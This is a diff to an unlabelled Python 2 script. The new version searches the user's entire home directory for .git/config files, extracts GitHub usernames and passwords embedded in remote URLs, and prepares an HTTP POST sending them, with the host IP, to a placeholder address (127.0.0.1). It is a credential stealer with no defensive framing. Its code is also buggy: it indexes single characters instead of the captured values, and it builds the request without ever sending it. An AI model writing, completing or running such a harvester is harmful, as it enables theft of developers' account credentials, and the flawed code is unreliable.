@@ -1,37 +1,36 @@
 #!/usr/bin/env python 
 
-import urllib
-import urllib2
-import sys
-import socket
-import re
+import urllib, urllib2, sys, socket, re, os
 
 ip = socket.gethostbyname(socket.gethostname())
 
-f = open('.git/config', 'r')
 
-l = []
-for lines in f:
-	l += lines
+files = [os.path.join(dp, f) for dp, dn, fn in os.walk(os.path.expanduser("~/")) for f in fn]
 
-m = ' '.join(l)
+for cur in files:
+    p1 = re.compile('\.git\/config$')
+    p2 = re.compile('\/\/(.+):(.+)@github.com')
+    m = p1.findall(cur)
+    if not(m == []):
+        f = open(cur, 'r')
+        l = []
+        for lines in f:
+                l.append(lines)
 
-print m
+        mess = ''.join(l).replace('\n', '')
+        m2 = re.match(r".+\/\/(.+):(.+)@github.com.+", mess)
+        if m2:
+            results = (m2.group(1), m2.group(2))
+            print results
+            url = 'http://127.0.0.1'
+            values = {'username' : results[0][0],
+                      'password' : results[0][1],
+                      'ip' : ip }
 
-r = re.search('\/(.', m)
+            print values
 
-print r
-
-
-url = 'http://127.0.0.1'
-values = {'username' : username,
-          'password' : password,
-          'ip' : ip }
-
-print values
-
-data = urllib.urlencode(values)
-req = urllib2.Request(url, data)
+            data = urllib.urlencode(values)
+            req = urllib2.Request(url, data)
 
 
 
